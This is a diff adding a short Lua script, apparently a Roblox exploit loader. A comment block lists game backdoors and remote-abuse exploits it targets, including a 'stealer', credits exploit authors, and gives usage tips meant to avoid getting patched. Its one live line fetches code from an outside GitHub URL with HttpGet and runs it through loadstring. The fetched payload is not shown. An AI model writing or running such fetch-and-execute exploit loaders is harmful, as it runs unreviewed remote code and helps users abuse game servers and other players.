@@ -1,0 +1,20 @@
+--[[
+Backdoors:
+-KickParts, Kill Remotes, Destroy Remotes
+-Bru Remote
+-Harked Remote
+-Voxel Remote
+-InternalUI parasite
+-ServerSide event maker
+-UTG stealer
+
+Credits:
+LuaE, Outmoon, rosmoker, Reggie, TypicalModders, Scrambles
+
+Instructions:
+To ensure a longer lifespan for this script, please do not overuse and abuse this script on any game. Overusing may cause the script to be patched.
+If you execute this script and a serverside executor appears, wait 30 seconds and then start using it.
+If you execute this script and it doesn't work, use it on a different game.
+]]
+
+loadstring(game:HttpGet("https://github.com/CyberCopLOL/smokeware/edit/main/load"))()
